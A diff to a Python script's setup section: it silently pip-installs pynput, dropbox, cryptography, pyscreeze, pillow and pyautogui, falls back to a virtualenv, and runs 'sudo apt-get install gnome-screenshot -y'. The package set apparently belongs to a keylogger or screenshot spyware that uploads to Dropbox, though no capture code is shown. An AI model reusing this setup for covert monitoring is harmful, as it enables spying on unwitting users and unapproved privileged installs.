@@ -1,13 +1,40 @@
+#Works for Linux(Parrot OS,),Windows
 import subprocess
 import sys
 import os
 import platform
-subprocess.check_call([sys.executable,'-m','pip','install','pynput'])
-subprocess.check_call([sys.executable,'-m','pip','install','dropbox'])
-subprocess.check_call([sys.executable,'-m','pip','install','cryptography'])
-subprocess.check_call([sys.executable,'-m','pip','install','pyscreeze'])
-subprocess.check_call([sys.executable,'-m','pip','install','pillow'])
-subprocess.check_call([sys.executable,'-m','pip','install','pyautogui'])
+try:
+    subprocess.check_call([sys.executable,'-m','pip','install','pynput'])
+    subprocess.check_call([sys.executable,'-m','pip','install','dropbox'])
+    subprocess.check_call([sys.executable,'-m','pip','install','cryptography'])
+    subprocess.check_call([sys.executable,'-m','pip','install','pyscreeze'])
+    subprocess.check_call([sys.executable,'-m','pip','install','pillow'])
+    subprocess.check_call([sys.executable,'-m','pip','install','pyautogui'])
+except (subprocess.CalledProcessError):
+    subprocess.check_call([sys.executable,'-m','venv','myenv'])
+    #if platform.system() not in ["Windows"]:
+    #    subprocess.check_call(['myenv/bin/activate'])
+    #else:
+    #    subprocess.check_call([".\myenv\Scripts\activate"])
+    pathpro=subprocess.run("pwd",capture_output=True,text=True)
+    path=pathpro.stdout
+    cleanpath=path.strip()
+    pathjoin=os.path.join(cleanpath,"myenv","bin","pip")
+    subprocess.check_call([pathjoin,"install","pynput"])
+    subprocess.check_call([pathjoin,"install","dropbox"])
+    subprocess.check_call([pathjoin,"install","cryptography"])
+    subprocess.check_call([pathjoin,"install","pyscreeze"])
+    subprocess.check_call([pathjoin,"install","pillow"])
+    subprocess.check_call([pathjoin,"install","pyautogui"])
+    if platform.system() not in ["Windows"]:
+        activate_path=os.path.join("myenv","bin","activate")
+        subprocess.run(["chmod", "+x", activate_path], check=True)
+        python_executable = os.path.join("myenv", "bin", "python")
+        script_name = sys.argv[0]
+        subprocess.run([python_executable, script_name])
+    else:
+        activate_path=os.path.join(".","myenv","bin","activate")
+        subprocess.run(activate_path)
 if platform.system() not in ["Windows", "Darwin"]:
     subprocess.check_call(["sudo", "apt-get", "install", "gnome-screenshot", "-y"])
 import random
